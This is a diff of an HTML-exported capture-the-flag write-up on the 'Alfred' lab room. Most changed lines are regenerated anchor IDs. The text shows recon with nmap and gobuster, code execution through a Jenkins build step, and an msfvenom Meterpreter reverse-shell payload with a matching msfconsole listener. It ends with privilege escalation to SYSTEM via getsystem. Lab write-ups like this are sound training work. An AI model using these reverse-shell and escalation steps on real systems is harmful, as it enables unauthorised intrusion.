@@ -22,43 +22,43 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#orgcbe5eb4">Intro</a></li>
-<li><a href="#org71d1d4f">Reconnaissance</a>
+<li><a href="#org462ee68">Intro</a></li>
+<li><a href="#org9773643">Reconnaissance</a>
 <ul>
-<li><a href="#orgb44c84e">Web Analysis: Port 80 Web Server</a></li>
-<li><a href="#org4d897f0">Web Analysis: Port 8080 Web Server</a></li>
+<li><a href="#org09464b6">Web Analysis: Port 80 Web Server</a></li>
+<li><a href="#org44e6303">Web Analysis: Port 8080 Web Server</a></li>
 </ul>
 </li>
-<li><a href="#org41b648c">Using Alfred</a></li>
-<li><a href="#org754f92a">Upgrading our shell</a>
+<li><a href="#org47e1046">Using Alfred</a></li>
+<li><a href="#org450e603">Upgrading our shell</a>
 <ul>
-<li><a href="#orgc4362cf">MSFvenom</a></li>
-<li><a href="#orgbbc0be0">Meterpreter listener</a></li>
-<li><a href="#org4507624">Downloading File</a></li>
+<li><a href="#orgdc94488">MSFvenom</a></li>
+<li><a href="#orgccef895">Meterpreter listener</a></li>
+<li><a href="#org4caaa77">Downloading File</a></li>
 </ul>
 </li>
-<li><a href="#org3d69c1d">Privilege escalation</a></li>
+<li><a href="#org7bc5cb8">Privilege escalation</a></li>
 </ul>
 </div>
 </div>
 
-<div id="outline-container-orgcbe5eb4" class="outline-2">
-<h2 id="orgcbe5eb4"><a href="#orgcbe5eb4">Intro</a></h2>
-<div class="outline-text-2" id="text-orgcbe5eb4">
+<div id="outline-container-org462ee68" class="outline-2">
+<h2 id="org462ee68"><a href="#org462ee68">Intro</a></h2>
+<div class="outline-text-2" id="text-org462ee68">
 <p>
 This time, other than just populating <code>/etc/hosts</code> with <code>alfred.thm</code>, I
 also ran the following, to help me use my <i>standardized</i> notes.
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org0a4fb40"><span class="org-builtin">echo</span> <span class="org-string">"export IP=alfred.thm"</span> &gt;&gt; ~/.bashrc
+<pre class="src src-bash" id="orgd970ecd"><span class="org-builtin">echo</span> <span class="org-string">"export IP=alfred.thm"</span> &gt;&gt; ~/.bashrc
 </pre>
 </div>
 </div>
 </div>
 
-<div id="outline-container-org71d1d4f" class="outline-2">
-<h2 id="org71d1d4f"><a href="#org71d1d4f">Reconnaissance</a></h2>
-<div class="outline-text-2" id="text-org71d1d4f">
+<div id="outline-container-org9773643" class="outline-2">
+<h2 id="org9773643"><a href="#org9773643">Reconnaissance</a></h2>
+<div class="outline-text-2" id="text-org9773643">
 <p>
 Simple nmap scan to find our open tcp ports:
 </p>
@@ -77,9 +77,9 @@ And this gives us:
 </ul>
 </div>
 
-<div id="outline-container-orgb44c84e" class="outline-3">
-<h3 id="orgb44c84e"><a href="#orgb44c84e">Web Analysis: Port 80 Web Server</a></h3>
-<div class="outline-text-3" id="text-orgb44c84e">
+<div id="outline-container-org09464b6" class="outline-3">
+<h3 id="org09464b6"><a href="#org09464b6">Web Analysis: Port 80 Web Server</a></h3>
+<div class="outline-text-3" id="text-org09464b6">
 <ul class="org-ul">
 <li>Minimal starting web page, started gobuster while trying the usual
 spots. Nothing of interest came up</li>
@@ -87,15 +87,15 @@ spots. Nothing of interest came up</li>
 </ul>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="orga44095d">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://$<span class="org-variable-name">IP</span> -o gobuster.big
+<pre class="src src-bash" id="orgc75f256">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://$<span class="org-variable-name">IP</span> -o gobuster.big
 </pre>
 </div>
 </div>
 </div>
 
-<div id="outline-container-org4d897f0" class="outline-3">
-<h3 id="org4d897f0"><a href="#org4d897f0">Web Analysis: Port 8080 Web Server</a></h3>
-<div class="outline-text-3" id="text-org4d897f0">
+<div id="outline-container-org44e6303" class="outline-3">
+<h3 id="org44e6303"><a href="#org44e6303">Web Analysis: Port 8080 Web Server</a></h3>
+<div class="outline-text-3" id="text-org44e6303">
 <ul class="org-ul">
 <li>Jenkins entry portal</li>
 <li>Robots.txt disallows everything on root</li>
@@ -111,7 +111,7 @@ spots. Nothing of interest came up</li>
 </ul></li>
 </ul>
 
-<div id="orgc082170" class="figure">
+<div id="org61759e0" class="figure">
 <p><img src="images/Reconnaissance/20231130_145031_screenshot.png" alt="20231130_145031_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 1: </span>Jenkins Entry portal</p>
@@ -130,9 +130,9 @@ another, better way to go.
 </div>
 </div>
 
-<div id="outline-container-org41b648c" class="outline-2">
-<h2 id="org41b648c"><a href="#org41b648c">Using Alfred</a></h2>
-<div class="outline-text-2" id="text-org41b648c">
+<div id="outline-container-org47e1046" class="outline-2">
+<h2 id="org47e1046"><a href="#org47e1046">Using Alfred</a></h2>
+<div class="outline-text-2" id="text-org47e1046">
 <p>
 Since I already knew that Alfred is a CI/CD server, even though I had
 never worked on it, it was relatively simple:
@@ -144,7 +144,7 @@ that action was <b>directly</b> modifiable.
 </p></li>
 </ul>
 
-<div id="org9dc27bf" class="figure">
+<div id="org81b1ef9" class="figure">
 <p><img src="images/Using_Alfred/20231201_231517_screenshot.png" alt="20231201_231517_screenshot.png" />
 </p>
 </div>
@@ -165,47 +165,47 @@ However, that did not stop me from getting the flag. Unlikeable is not unusable.
 </div>
 </div>
 
-<div id="outline-container-org754f92a" class="outline-2">
-<h2 id="org754f92a"><a href="#org754f92a">Upgrading our shell</a></h2>
-<div class="outline-text-2" id="text-org754f92a">
+<div id="outline-container-org450e603" class="outline-2">
+<h2 id="org450e603"><a href="#org450e603">Upgrading our shell</a></h2>
+<div class="outline-text-2" id="text-org450e603">
 <p>
 The room then suggests that we get a meterpreter shell, which I again,
 trying to avoid the <i>walkthrough</i> character of it, did my way.
 </p>
 </div>
 
-<div id="outline-container-orgc4362cf" class="outline-3">
-<h3 id="orgc4362cf"><a href="#orgc4362cf">MSFvenom</a></h3>
-<div class="outline-text-3" id="text-orgc4362cf">
+<div id="outline-container-orgdc94488" class="outline-3">
+<h3 id="orgdc94488"><a href="#orgdc94488">MSFvenom</a></h3>
+<div class="outline-text-3" id="text-orgdc94488">
 <p>
 Just a simple meterpreter reverse shell:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-cmd" id="org2f1b025">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.67.161 LPORT=6969 -f exe -o reverse.exe
+<pre class="src src-cmd" id="org7fd5e4e">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.67.161 LPORT=6969 -f exe -o reverse.exe
 </pre>
 </div>
 </div>
 </div>
 
 
-<div id="outline-container-orgbbc0be0" class="outline-3">
-<h3 id="orgbbc0be0"><a href="#orgbbc0be0">Meterpreter listener</a></h3>
-<div class="outline-text-3" id="text-orgbbc0be0">
+<div id="outline-container-orgccef895" class="outline-3">
+<h3 id="orgccef895"><a href="#orgccef895">Meterpreter listener</a></h3>
+<div class="outline-text-3" id="text-orgccef895">
 <p>
 Get the listener up and running
 </p>
 
 <div class="org-src-container">
-<pre class="src src-cmd" id="org7457a3e">msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.67.161; set lport 6969; exploit"
+<pre class="src src-cmd" id="orgbb5b198">msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.67.161; set lport 6969; exploit"
 </pre>
 </div>
 </div>
 </div>
 
-<div id="outline-container-org4507624" class="outline-3">
-<h3 id="org4507624"><a href="#org4507624">Downloading File</a></h3>
-<div class="outline-text-3" id="text-org4507624">
+<div id="outline-container-org4caaa77" class="outline-3">
+<h3 id="org4caaa77"><a href="#org4caaa77">Downloading File</a></h3>
+<div class="outline-text-3" id="text-org4caaa77">
 <p>
 My experience with windows is quite limited and that&rsquo;s why I had to go
 into a little bit more research to get this over with :(
@@ -231,9 +231,9 @@ procedure in Linux.
 </div>
 </div>
 
-<div id="outline-container-org3d69c1d" class="outline-2">
-<h2 id="org3d69c1d"><a href="#org3d69c1d">Privilege escalation</a></h2>
-<div class="outline-text-2" id="text-org3d69c1d">
+<div id="outline-container-org7bc5cb8" class="outline-2">
+<h2 id="org7bc5cb8"><a href="#org7bc5cb8">Privilege escalation</a></h2>
+<div class="outline-text-2" id="text-org7bc5cb8">
 <p>
 Sadly <code>getsystem</code> works perfectly, and we get <code>NT AUTHORITY\SYSTEM</code>,
 without it being necessary to do anything.
